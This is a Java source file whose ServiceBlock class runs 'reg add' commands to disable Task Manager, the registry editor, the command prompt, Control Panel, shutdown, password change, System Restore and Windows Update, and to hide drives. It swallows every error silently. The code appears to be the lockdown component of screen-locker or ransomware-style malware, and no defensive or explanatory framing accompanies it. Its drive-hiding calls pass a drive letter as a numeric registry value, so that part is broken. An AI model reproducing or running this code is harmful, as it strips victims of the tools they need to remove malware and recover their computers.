package kr.pah;

import java.io.IOException;

public class ServiceBlock {
    public static void blockAll() {
        disableTaskManager();
        disableControlPanel();
        disableRegistryEditor();
        disableFolderOptions();
        disableRunCommand();
        disableSystemProperties();
        disableLogOff();
        disableChangePassword();
        disableShutDownOptions();
        disableCommandPrompt();
        disableNetworkProperties();
        disableSystemRestore();
        disableWindowsUpdate();
        disableDriveAccess("C");
        disableDriveAccess("D");
        disableDriveAccess("E");
        disableDriveAccess("F");
    }

    public static void disableTaskManager() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableControlPanel() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableRegistryEditor() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableFolderOptions() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableRunCommand() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableSystemProperties() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoPropertiesMyComputer", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableLogOff() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "StartMenuLogOff", "0");
        } catch (Exception ignored) {
        }
    }

    public static void disableChangePassword() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableShutDownOptions() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoClose", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableCommandPrompt() {
        try {
            setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableNetworkProperties() {
        try {
            setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\Network Connections", "NC_LanProperties", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableSystemRestore() {
        try {
            setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableSR", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableWindowsUpdate() {
        try {
            setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "NoAutoUpdate", "1");
        } catch (Exception ignored) {
        }
    }

    public static void disableDriveAccess(String driveLetter) {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives", driveLetter);
        } catch (Exception ignored) {
        }
    }

    private static void setRegistryValue(String path, String name, String value) {
        try {
            String command = "reg add \"" + path + "\" /v " + name + " /t REG_DWORD /d " + value + " /f";
            Runtime.getRuntime().exec(command);
        } catch (IOException ignored) {
        }
    }
}
